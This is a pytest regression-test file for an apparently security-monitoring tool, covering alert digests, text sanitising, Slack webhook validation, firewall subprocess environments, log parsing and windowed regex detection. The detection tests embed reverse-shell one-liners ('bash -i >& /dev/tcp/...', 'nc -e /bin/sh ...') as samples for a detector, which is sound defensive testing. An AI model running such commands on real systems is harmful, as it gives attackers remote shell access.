"""Regression tests for the latest review fixes.

Covers digest accuracy and text hardening, the total notify deadline, the Slack
webhook rule, the minimal firewall-command environment, access-log padding
evasion and the windowed regex search. Tailer, doctor/init and offline-intel
fixes live next to their feature tests (``test_reader_limits.py``,
``test_setup_cli.py``, ``test_intel_offline.py``). All data is synthetic.
"""

from __future__ import annotations

import os
import re
import subprocess
import time
from collections.abc import Iterator
from datetime import datetime, timedelta, timezone
from pathlib import Path
from types import SimpleNamespace
from typing import Any

import pytest

import sentinelai.detection.rules  # noqa: F401  (registers the built-in rules)
from sentinelai.config.models import FirewallConfig
from sentinelai.core.models import Alert, RiskAssessment, RiskLevel
from sentinelai.core.store import AlertStore
from sentinelai.detection.base import available_rules
from sentinelai.detection.rules.network import _REVERSE_SHELL
from sentinelai.firewall import adapters
from sentinelai.firewall.adapters import CommandAdapter
from sentinelai.notify import base as notify_base
from sentinelai.notify.base import NotifyError, clean_text, post_json
from sentinelai.notify.digest import build_digest
from sentinelai.notify.slack import validate_webhook_url
from sentinelai.parsers.apache import ApacheAccessParser
from sentinelai.parsers.nginx import NginxAccessParser
from sentinelai.utils.regex import search_windowed
from tests.conftest import make_event

NOW = datetime(2026, 3, 10, 12, 0, 0, tzinfo=timezone.utc)
CUTOFF = NOW - timedelta(hours=24)


# -- helpers ---------------------------------------------------------------


@pytest.fixture()
def store(tmp_path: Path) -> Iterator[AlertStore]:
    db = AlertStore(tmp_path / "alerts.db")
    try:
        yield db
    finally:
        db.close()


def _save(
    store: AlertStore,
    *,
    title: str = "Test alert",
    score: float = 50,
    age_hours: float = 1.0,
    ip: str | None = "203.0.113.9",
    user: str | None = None,
    raw_ip: str | None = None,
) -> Alert:
    """Save a real, rule-built alert; ``raw_ip`` overrides ``alert.ip`` verbatim."""
    rule = available_rules()["R001"]()
    alert = rule.make_alert(make_event(ip=ip, user=user), title, "synthetic alert")
    alert.risk = RiskAssessment(score=score, level=RiskLevel.from_score(score))
    alert.created_at = NOW - timedelta(hours=age_hours)
    if raw_ip is not None:
        alert.ip = raw_ip
    store.save(alert)
    return alert


def _alert_lines(body: str) -> list[str]:
    return [line for line in body.splitlines() if line.startswith("  [")]


# -- digest accuracy -------------------------------------------------------


class TestDigestAccuracy:
    @pytest.fixture()
    def busy_store(self, store: AlertStore) -> AlertStore:
        _save(store, title="Root compromise", score=95, age_hours=5)
        # Insert the flood quickly: one rule-built row cloned in SQL, newest ids last.
        _save(store, title="Noise", score=20, age_hours=1)
        columns = [
            row[1]
            for row in store._conn.execute("PRAGMA table_info(alerts)").fetchall()  # noqa: SLF001
            if row[1] != "id"
        ]
        names = ", ".join(columns)
        for _ in range(12):  # doubling: 1 -> 4096 rows at most
            store._conn.execute(  # noqa: SLF001
                f"INSERT INTO alerts ({names}) SELECT {names} FROM alerts "  # noqa: S608
                "WHERE risk_score < 50"
            )
            if store.count_alerts_since(CUTOFF) >= 3001:
                break
        store._conn.execute(  # noqa: SLF001
            "DELETE FROM alerts WHERE id IN (SELECT id FROM alerts WHERE risk_score < 50 "
            "ORDER BY id DESC LIMIT ?)",
            (max(0, store.count_alerts_since(CUTOFF) - 3001),),
        )
        store._conn.commit()  # noqa: SLF001
        return store

    def test_fixture_holds_one_critical_and_3000_low_alerts(self, busy_store: AlertStore) -> None:
        assert busy_store.count_alerts_by_level_since(CUTOFF) == {"critical": 1, "low": 3000}

    def test_critical_alert_is_reported_even_when_older_than_a_flood(
        self, busy_store: AlertStore
    ) -> None:
        message = build_digest(busy_store, now=NOW)

        lines = _alert_lines(message.body)
        assert lines[0].startswith("  [CRITICAL 95]")
        assert "Root compromise" in lines[0]
        assert "1 needs attention" in message.subject

    def test_counts_are_exact_not_capped_by_the_scan_limit(self, busy_store: AlertStore) -> None:
        message = build_digest(busy_store, now=NOW)

        assert "3001 alerts" in message.subject
        assert "Total alerts: 3001 (1 critical, 3000 low)" in message.body

    def test_more_alerts_not_shown_line_uses_the_exact_remainder(
        self, busy_store: AlertStore
    ) -> None:
        message = build_digest(busy_store, now=NOW, max_alerts=10)

        assert len(_alert_lines(message.body)) == 10
        assert "(2991 more alerts not shown)" in message.body

    def test_liveness_line_shows_the_last_alert_time(self, busy_store: AlertStore) -> None:
        message = build_digest(busy_store, now=NOW)

        assert "Last alert recorded: 2026-03-10 11:00 UTC" in message.body

    def test_empty_store_reports_that_no_alert_was_ever_recorded(
        self, store: AlertStore
    ) -> None:
        message = build_digest(store, now=NOW)

        assert "No alert has ever been recorded" in message.body
        assert "Last alert recorded" not in message.body
        assert "no alerts" in message.subject

    def test_quiet_window_with_old_alert_still_shows_liveness(self, store: AlertStore) -> None:
        _save(store, age_hours=100)

        message = build_digest(store, now=NOW)

        assert "no alerts" in message.subject
        assert "Last alert recorded: 2026-03-06 08:00 UTC" in message.body
        assert "No alert has ever been recorded" not in message.body


class TestStoreCountingApi:
    def test_alerts_since_orders_by_risk_then_newest_and_honours_limit(
        self, store: AlertStore
    ) -> None:
        _save(store, title="low-old", score=20, age_hours=9)
        _save(store, title="crit", score=95, age_hours=8)
        _save(store, title="low-new", score=20, age_hours=2)

        titles = [a.title for a in store.alerts_since(CUTOFF, limit=2)]

        assert titles == ["crit", "low-new"]

    def test_alerts_since_excludes_alerts_before_the_cutoff(self, store: AlertStore) -> None:
        _save(store, title="old", age_hours=30)
        _save(store, title="new", age_hours=1)

        assert [a.title for a in store.alerts_since(CUTOFF)] == ["new"]

    def test_alerts_since_with_zero_limit_returns_nothing(self, store: AlertStore) -> None:
        _save(store)

        assert store.alerts_since(CUTOFF, limit=0) == []
        assert store.alerts_since(CUTOFF, limit=-5) == []

    def test_counts_group_by_level_and_total(self, store: AlertStore) -> None:
        _save(store, score=95)
        _save(store, score=95)
        _save(store, score=20)
        _save(store, score=95, age_hours=40)

        assert store.count_alerts_by_level_since(CUTOFF) == {"critical": 2, "low": 1}
        assert store.count_alerts_since(CUTOFF) == 3

    def test_counts_are_zero_for_an_empty_store(self, store: AlertStore) -> None:
        assert store.count_alerts_by_level_since(CUTOFF) == {}
        assert store.count_alerts_since(CUTOFF) == 0

    def test_latest_alert_time_is_none_for_an_empty_store(self, store: AlertStore) -> None:
        assert store.latest_alert_time() is None

    def test_latest_alert_time_is_the_newest_stored_alert(self, store: AlertStore) -> None:
        _save(store, age_hours=3)
        _save(store, age_hours=2)

        assert store.latest_alert_time() == NOW - timedelta(hours=2)


# -- digest text hardening -------------------------------------------------


class TestCleanText:
    @pytest.mark.parametrize(
        ("raw", "expected"),
        [
            ("pay‮load", "payload"),  # right-to-left override
            ("pay‭load", "payload"),
            ("zero​width‍join", "zerowidthjoin"),
            ("line sep", "linesep"),
            ("para sep", "parasep"),
            ("bell\x07esc\x1b[31m", "bellesc[31m"),
            ("tab\there", "tab here"),
            ("keep\nnewline", "keep\nnewline"),
        ],
    )
    def test_dangerous_characters_are_removed(self, raw: str, expected: str) -> None:
        assert clean_text(raw, 100) == expected


class TestDigestTextHardening:
    def test_bidi_zero_width_and_line_separator_never_reach_the_digest(
        self, store: AlertStore
    ) -> None:
        _save(store, title="Login‮ fail​ed now", user="ad‮min")

        message = build_digest(store, now=NOW)

        for char in ("‮", "​", " "):
            assert char not in message.body
            assert char not in message.subject
        assert "Login failednow" in message.body

    def test_invalid_alert_ip_is_shown_as_a_question_mark(self, store: AlertStore) -> None:
        _save(store, raw_ip="999.1.1.1 <b>evil</b>")

        body = build_digest(store, now=NOW).body

        (line,) = _alert_lines(body)
        assert " from ? " in line
        assert "999.1.1.1" not in body
        assert "evil" not in body

    def test_valid_alert_ip_is_shown_canonically(self, store: AlertStore) -> None:
        _save(store, raw_ip=" 203.0.113.9 ")

        (line,) = _alert_lines(build_digest(store, now=NOW).body)

        assert " from 203.0.113.9 " in line

    def test_hostname_like_user_is_defanged(self, store: AlertStore) -> None:
        _save(store, user="evil.example")

        (line,) = _alert_lines(build_digest(store, now=NOW).body)

        assert "(user evil[.]example)" in line
        assert "evil.example" not in line

    def test_url_like_user_cannot_become_a_link(self, store: AlertStore) -> None:
        _save(store, user="http://evil.example/x")

        body = build_digest(store, now=NOW).body

        assert "://" not in body
        assert "evil[.]example" in body

    def test_plain_user_name_is_left_alone(self, store: AlertStore) -> None:
        _save(store, user="deploy")

        (line,) = _alert_lines(build_digest(store, now=NOW).body)

        assert "(user deploy)" in line


# -- notify total deadline --------------------------------------------------


class _Clock:
    def __init__(self) -> None:
        self.now = 1000.0

    def __call__(self) -> float:
        return self.now


class _DrippingResponse:
    """2xx response whose body arrives one byte at a time while the clock jumps."""

    def __init__(self, clock: _Clock, jump: float) -> None:
        self.status_code = 200
        self.closed = False
        self.bytes_served = 0
        self._clock = clock
        self._jump = jump

    def iter_content(self, chunk_size: int = 1) -> Iterator[bytes]:
        while True:
            self._clock.now += self._jump
            self.bytes_served += 1
            yield b"x"

    def close(self) -> None:
        self.closed = True


class _Session:
    def __init__(self, response: Any) -> None:
        self._response = response

    def post(self, url: str, **kwargs: Any) -> Any:
        return self._response


class TestNotifyTotalDeadline:
    def test_dripping_body_past_the_timeout_raises_response_too_slow(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        clock = _Clock()
        monkeypatch.setattr(notify_base, "time", SimpleNamespace(monotonic=clock))
        response = _DrippingResponse(clock, jump=10.0)

        with pytest.raises(NotifyError, match="slack response too slow"):
            post_json(_Session(response), "https://hooks.slack.com/x", {}, 5.0, "slack")  # type: ignore[arg-type]

        assert response.closed
        assert response.bytes_served == 1  # aborted at the first re-check

    def test_slow_body_error_is_secret_free(self, monkeypatch: pytest.MonkeyPatch) -> None:
        clock = _Clock()
        monkeypatch.setattr(notify_base, "time", SimpleNamespace(monotonic=clock))
        url = "https://hooks.slack.com/services/T0FAKE/B0FAKE/SecretPart"

        with pytest.raises(NotifyError) as excinfo:
            post_json(
                _Session(_DrippingResponse(clock, 10.0)),  # type: ignore[arg-type]
                url,
                {},
                5.0,
                "telegram",
            )

        assert "SecretPart" not in str(excinfo.value)
        assert str(excinfo.value) == "telegram response too slow"

    def test_clock_already_past_the_deadline_after_the_status_check_is_too_slow(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        clock = _Clock()
        monkeypatch.setattr(notify_base, "time", SimpleNamespace(monotonic=clock))

        class _SlowStart(_DrippingResponse):
            @property  # type: ignore[override]
            def status_code(self) -> int:
                clock.now += 60.0  # reading the status "took" a minute
                return 200

            @status_code.setter
            def status_code(self, value: int) -> None:
                return None

        with pytest.raises(NotifyError, match="response too slow"):
            post_json(_Session(_SlowStart(clock, 0.0)), "https://x.example", {}, 5.0, "slack")  # type: ignore[arg-type]

    def test_body_within_the_deadline_is_accepted_and_capped(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        clock = _Clock()
        monkeypatch.setattr(notify_base, "time", SimpleNamespace(monotonic=clock))
        response = _DrippingResponse(clock, jump=0.0)

        post_json(_Session(response), "https://hooks.slack.com/x", {}, 5.0, "slack")  # type: ignore[arg-type]

        assert response.bytes_served == notify_base.MAX_RESPONSE_BYTES
        assert response.closed


# -- Slack webhook rule ------------------------------------------------------


class TestValidateWebhookUrl:
    @pytest.mark.parametrize(
        ("url", "allow_any_host", "ok"),
        [
            ("https://hooks.slack.com/services/T/B/x", False, True),
            ("https://slack.com/api/hook", False, True),
            ("https://a.b.slack.com/x", False, True),
            ("https://HOOKS.SLACK.COM/x", False, True),
            ("http://hooks.slack.com/x", False, False),
            ("ftp://hooks.slack.com/x", False, False),
            ("hooks.slack.com/x", False, False),
            ("https://", False, False),
            ("", False, False),
            ("https://evilslack.com/x", False, False),
            ("https://slack.com.evil.example/x", False, False),
            ("https://hooks.slack.com@evil.example/x", False, False),
            ("https://evil.example/hooks.slack.com", False, False),
            ("https://hooks.slack.com/x y", False, False),
            ("https://hooks.slack.com/x\n", False, False),
            ("https://hooks.slack.com/\x00x", False, False),
            ("https://[::1/x", False, False),  # unparsable netloc
            ("https://chat.example.test/hook", False, False),
            ("https://chat.example.test/hook", True, True),
            ("http://chat.example.test/hook", True, False),  # https always required
            ("https://", True, False),
        ],
    )
    def test_truth_table(self, url: str, allow_any_host: bool, ok: bool) -> None:
        error = validate_webhook_url(url, allow_any_host)

        assert (error is None) is ok

    @pytest.mark.parametrize("value", [None, 5, b"https://hooks.slack.com/x", ["x"]])
    def test_non_string_input_is_invalid_not_an_exception(self, value: Any) -> None:
        assert validate_webhook_url(value) is not None

    def test_error_text_never_contains_the_url(self) -> None:
        error = validate_webhook_url("https://evil.example/services/T/B/LeakyPart")

        assert error is not None
        assert "LeakyPart" not in error
        assert "evil" not in error


# -- firewall command environment -------------------------------------------


class TestCommandAdapterEnvironment:
    @pytest.fixture()
    def recorded(self, monkeypatch: pytest.MonkeyPatch) -> list[dict[str, Any]]:
        calls: list[dict[str, Any]] = []

        def fake_run(args: list[str], **kwargs: Any) -> subprocess.CompletedProcess[str]:
            calls.append({"args": args, **kwargs})
            return subprocess.CompletedProcess(args, 0, stdout="", stderr="")

        monkeypatch.setattr(adapters.subprocess, "run", fake_run)
        return calls

    @staticmethod
    def _adapter() -> CommandAdapter:
        return CommandAdapter(FirewallConfig(adapter="command", command="fw-tool"))

    def test_secrets_from_the_parent_environment_are_not_inherited(
        self, monkeypatch: pytest.MonkeyPatch, recorded: list[dict[str, Any]]
    ) -> None:
        monkeypatch.setenv("SENTINELAI_NOTIFY_SLACK_WEBHOOK", "https://hooks.slack.com/fake")
        monkeypatch.setenv("SENTINELAI_INTEL_ABUSEIPDB_API_KEY", "fake-key")
        monkeypatch.setenv("AWS_SECRET_ACCESS_KEY", "fake-aws")
        monkeypatch.setenv("PATH", "/usr/sbin:/usr/bin")

        assert self._adapter().block_ip("203.0.113.9") is True

        env = recorded[0]["env"]
        assert "SENTINELAI_NOTIFY_SLACK_WEBHOOK" not in env
        assert "SENTINELAI_INTEL_ABUSEIPDB_API_KEY" not in env
        assert "AWS_SECRET_ACCESS_KEY" not in env
        assert not any("fake" in value for value in env.values())
        assert env["PATH"] == "/usr/sbin:/usr/bin"

    def test_environment_only_has_the_minimal_keys(
        self, monkeypatch: pytest.MonkeyPatch, recorded: list[dict[str, Any]]
    ) -> None:
        monkeypatch.setenv("HOME", "/home/sentinel")
        monkeypatch.setenv("SOME_OTHER_VARIABLE", "x")

        self._adapter().unblock_ip("203.0.113.9")

        assert set(recorded[0]["env"]) <= {"PATH", "LC_ALL", "LANG", "HOME"}
        assert recorded[0]["env"]["HOME"] == "/home/sentinel"

    def test_command_runs_without_a_shell(self, recorded: list[dict[str, Any]]) -> None:
        self._adapter().block_ip("203.0.113.9")

        assert recorded[0]["shell"] is False
        assert recorded[0]["args"] == ["fw-tool", "block", "203.0.113.9"]

    def test_every_action_gets_the_minimal_environment(
        self, monkeypatch: pytest.MonkeyPatch, recorded: list[dict[str, Any]]
    ) -> None:
        monkeypatch.setenv("SENTINELAI_NOTIFY_TELEGRAM_TOKEN", "123456789:fakefakefake")
        adapter = self._adapter()

        adapter.block_ip("203.0.113.9")
        adapter.temporary_block("203.0.113.9", 60)
        adapter.unblock_ip("203.0.113.9")
        adapter.list_blocked()

        assert len(recorded) == 4
        for call in recorded:
            assert "SENTINELAI_NOTIFY_TELEGRAM_TOKEN" not in call["env"]


# -- access-log padding evasion ---------------------------------------------

_PARSERS = [NginxAccessParser, ApacheAccessParser]


def _access_line(path_length: int, status: int = 404) -> str:
    path = "/" + "a" * (path_length - 1)
    return (
        f'203.0.113.9 - - [10/Oct/2024:13:55:36 +0000] "GET {path} HTTP/1.1" '
        f'{status} 512 "-" "curl/8.0"'
    )


@pytest.mark.parametrize("parser_cls", _PARSERS, ids=["nginx", "apache"])
class TestAccessLogPaddingEvasion:
    def test_20k_character_path_still_parses_and_keeps_the_status(
        self, parser_cls: type
    ) -> None:
        event = parser_cls().parse_line(_access_line(20_000))

        assert event is not None
        assert event.extra["status"] == 404
        assert len(event.extra["path"]) == 20_000
        assert event.ip == "203.0.113.9"
        assert event.extra["user_agent"] == "curl/8.0"

    def test_20k_character_path_is_still_recognised_by_match_score(
        self, parser_cls: type
    ) -> None:
        assert parser_cls().match_score([_access_line(20_000)]) == 1.0

    def test_60k_character_request_line_parses_in_under_a_second(self, parser_cls: type) -> None:
        line = _access_line(59_985, status=500)
        assert 60_000 < len(line) < 65_536

        started = time.perf_counter()
        event = parser_cls().parse_line(line)
        elapsed = time.perf_counter() - started

        assert event is not None
        assert event.extra["status"] == 500
        assert elapsed < 1.0

    def test_unterminated_quote_with_padding_is_rejected_quickly(self, parser_cls: type) -> None:
        line = (
            '203.0.113.9 - - [10/Oct/2024:13:55:36 +0000] "GET /' + "a b " * 15_000
        )

        started = time.perf_counter()
        event = parser_cls().parse_line(line)
        elapsed = time.perf_counter() - started

        assert event is None
        assert elapsed < 1.0

    def test_raw_line_is_preserved_in_full(self, parser_cls: type) -> None:
        line = _access_line(20_000)

        event = parser_cls().parse_line(line)

        assert event is not None
        assert event.raw == line


# -- windowed regex search --------------------------------------------------


class TestSearchWindowed:
    def test_reverse_shell_after_4000_characters_of_padding_is_found(self) -> None:
        text = "A" * 4000 + " bash -i >& /dev/tcp/203.0.113.9/4444 0>&1"

        match = search_windowed(_REVERSE_SHELL, text)

        assert match is not None
        assert match.start() >= 4000
        assert match.string is text
        assert "/dev/tcp/" in match.group(0)

    def test_reverse_shell_after_50000_characters_of_padding_is_found(self) -> None:
        text = "x " * 25_000 + "nc -e /bin/sh 203.0.113.9 4444"

        match = search_windowed(_REVERSE_SHELL, text)

        assert match is not None
        assert match.group(0).startswith("nc")

    def test_padding_without_a_payload_gives_no_match(self) -> None:
        assert search_windowed(_REVERSE_SHELL, "nc " * 5000) is None

    @pytest.mark.parametrize(
        "text",
        [
            "",
            "nothing here",
            "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1",
            "x" * 2048,
            "x" * 2000 + "nc -e /bin/sh",
        ],
    )
    def test_short_text_behaves_exactly_like_pattern_search(self, text: str) -> None:
        expected = _REVERSE_SHELL.search(text)

        actual = search_windowed(_REVERSE_SHELL, text)

        assert (actual is None) is (expected is None)
        if expected is not None and actual is not None:
            assert actual.span() == expected.span()

    @pytest.mark.parametrize(
        ("window", "overlap"),
        [(0, 0), (-5, 0), (10, 10), (10, 20), (10, -1), (1, 1)],
    )
    def test_invalid_window_or_overlap_is_rejected(self, window: int, overlap: int) -> None:
        with pytest.raises(ValueError, match="window"):
            search_windowed(re.compile("x"), "short", window=window, overlap=overlap)

    @pytest.mark.parametrize("length", [99, 100, 101, 189, 190, 191, 270, 271])
    def test_needle_is_found_at_every_position_around_window_boundaries(
        self, length: int
    ) -> None:
        needle = "NEEDLE"  # shorter than the overlap, so it is always fully inside a window
        pattern = re.compile(needle)
        for start in range(length - len(needle) + 1):
            text = "." * start + needle + "." * (length - start - len(needle))

            match = search_windowed(pattern, text, window=100, overlap=10)

            assert match is not None, f"missed needle at {start} (length {length})"
            assert match.span() == (start, start + len(needle))

    def test_text_exactly_window_long_is_searched_once(self) -> None:
        pattern = re.compile("END$")
        text = "." * 97 + "END"

        match = search_windowed(pattern, text, window=100, overlap=10)

        assert match is not None
        assert match.span() == (97, 100)

    def test_text_one_past_the_window_still_matches_the_last_character(self) -> None:
        pattern = re.compile("Z$")
        text = "." * 100 + "Z"

        assert search_windowed(pattern, text, window=100, overlap=10) is not None

    def test_absent_needle_in_long_text_returns_none(self) -> None:
        assert search_windowed(re.compile("NEEDLE"), "." * 1000, window=100, overlap=10) is None

    def test_first_match_in_text_order_is_returned(self) -> None:
        pattern = re.compile("hit")
        text = "." * 150 + "hit" + "." * 100 + "hit"

        match = search_windowed(pattern, text, window=100, overlap=10)

        assert match is not None
        assert match.start() == 150

    def test_word_boundary_at_a_window_start_still_sees_the_previous_character(self) -> None:
        # Windows start at multiples of 90; the needle begins at 90, glued to an 'x'.
        pattern = re.compile(r"\bNEEDLE")
        text = "." * 89 + "x" + "NEEDLE" + "." * 100

        assert search_windowed(pattern, text, window=100, overlap=10) is None

    def test_default_arguments_cover_a_payload_beyond_one_window(self) -> None:
        text = "." * 3000 + "NEEDLE"

        match = search_windowed(re.compile("NEEDLE"), text)

        assert match is not None
        assert match.start() == 3000


def test_environment_marker_is_not_leaked_into_the_test_process() -> None:
    # Guard: the env-var tests above only ever use monkeypatch.
    assert "SENTINELAI_NOTIFY_SLACK_WEBHOOK" not in os.environ
